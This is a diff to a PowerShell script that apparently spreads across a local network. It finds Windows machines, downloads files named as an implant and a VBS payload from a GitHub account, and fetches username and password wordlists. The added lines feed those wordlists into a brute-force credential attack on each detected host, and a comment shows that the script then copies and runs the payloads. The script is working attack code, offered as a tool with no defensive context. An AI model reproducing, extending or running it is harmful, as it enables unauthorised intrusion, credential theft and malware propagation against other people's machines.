@@ -165,12 +165,18 @@ Write-Host "Detected Windows machines: $($windowsDevices -join ', ')"
 # 7. Download files to share
 $DiscordFileUrl = "https://github.com/ngabubbon/ngabubbon/raw/refs/heads/main/implantt1.ps1"
 $DiscordFileUrl2 = "https://github.com/ngabubbon/ngabubbon/raw/refs/heads/main/avaus.vbs"
+$DiscordFileUrl3 = "https://github.com/kkrypt0nn/wordlists/raw/refs/heads/main/wordlists/usernames/xato_net_usernames.txt"
+$DiscordFileUrl4 = "https://github.com/kkrypt0nn/wordlists/raw/refs/heads/main/wordlists/passwords/xato_net_passwords.txt"
 $DestinationPath = "$sharedFolder\implantti.ps1"
 $DestinationPath2 = "$sharedFolder\avaus.bat"
+$DestinationPath3 = "$sharedFolder\xato_net_usernames.txt"
+$DestinationPath4 = "$sharedFolder\xato_net_passwords.txt"
 
 try {
     Invoke-WebRequest -Uri $DiscordFileUrl -OutFile $DestinationPath
     Invoke-WebRequest -Uri $DiscordFileUrl2 -OutFile $DestinationPath2
+    Invoke-WebRequest -Uri $DiscordFileUrl3 -OutFile $DestinationPath3
+    Invoke-WebRequest -Uri $DiscordFileUrl4 -OutFile $DestinationPath4
     Write-Host "Files downloaded successfully to $sharedFolder\"
 } catch {
     Write-Host "An error occurred while downloading the files: $_"
@@ -264,7 +270,7 @@ foreach ($ip in $windowsDevices) {
     }
     # Attempt Brute-Forcing Credentials
     else {
-        $credential = Brute-ForceCredentials -targetIP $ip -userList "C:\path\to\userlist.txt" -passList "C:\path\to\passlist.txt"
+        $credential = Brute-ForceCredentials -targetIP $ip -userList $DestinationPath3 -passList $DestinationPath4
     }
 
     # If any method succeeded, copy and execute files
